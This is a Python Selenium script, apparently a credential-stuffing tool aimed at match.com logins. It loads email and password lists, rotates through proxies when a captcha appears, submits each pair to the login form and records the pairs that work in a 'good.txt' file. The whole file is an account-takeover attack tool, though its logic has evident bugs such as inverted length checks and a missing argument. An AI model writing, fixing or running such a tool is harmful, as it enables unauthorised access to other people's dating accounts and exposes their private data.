from core.logs import Logs
from core.files import Files
from selenium import webdriver
from selenium.webdriver.common.proxy import *
import json

import time
class Parser:
    def start():
        Parser.before_auth(email = 0, next = 0, proxy = 0, res = 0)

    def before_auth(email, next, proxy, res):
        emails = Files.get_file("config/emails.txt", check=1)
        if res == 1:
            if len(emails) <= email + 1:
                email = email + 1
            else:
                Logs.info("Emails list is empty")
        else:
            if len(emails) <= email + 1:
                Logs.info('Check auth from ' + emails[email])
                Parser.proxy_settings(email, next, proxy, res) 
            else:
                Logs.Info("Emails list is empty")
    def proxy_settings(email, next, proxy, res):
        proxys = Files.get_file("config/proxy.txt", check=1)
        if len(proxys) >= proxy + 1:
            chrome_options = webdriver.ChromeOptions()
            chrome_options.add_argument('--proxy-server=%s' % proxys[proxy])
            browser = webdriver.Chrome('bin/chromedriver.exe',chrome_options=chrome_options)
            Parser.auth(browser,email, next, proxy, res)
        else:
            Logs.info("Proxy list is empty")
           
    def auth(browser,email, next, proxy, res):
        url = "http://www.match.com/login/"
        browser.get(url)
        # if status == 200:
        current_url = browser.current_url
        if current_url == 'https://uk.match.com/':
            Parser.uk_match(browser,email, next, proxy, res)
        else:
            Parser.match(browser,email, next, proxy, res)
        # else:
        #     Logs.error("Error in Proxy")
        #     browser.quit()
        #     proxyNew = proxy + 1
        #     Parser.before_auth(email, next, proxyNew, res)
        
        
    def uk_match(browser,email, next, proxy, res):
        button = browser.find_element_by_class_name("button--normal")
        button.click()
    def match(browser,email, next, proxy, res):



        passwords = Files.get_file("config/pass.txt", check=1)
        emails = Files.get_file("config/emails.txt", check=1)



        login = emails[email]
        password = passwords[next]

        usernameInput = browser.find_element_by_id("email")
        passInput = browser.find_element_by_id("password") 
        usernameInput.send_keys(login).click()
        passInput.send_keys(password).click()
        button = browser.find_element_by_xpath("//button[@role = 'button']").submit()
        time.sleep(3)
        if browser.find_element_by_tag_name("iframe"):
            Logs.error("Captcha needed")
            browser.quit()
            Parser.before_auth(email,next,proxy = proxy + 1,res = 0)
        else:
            current_url = browser.current_url
            if current_url == 'https://www.match.com/login':
                bad = "config/bad.txt"
                with open(bad, 'a') as file:
                    file.write(login +":" + password)
                    Parser.before_auth(email,next = next + 1, res = 0)
            else:
                good = "config/good.txt"
                with open(good, 'a') as file:
                    file.write(login +":" + password)
                    Parser.before_auth(email,next = next + 1, res = 1)
        Logs.create_log(browser,login,password)


        
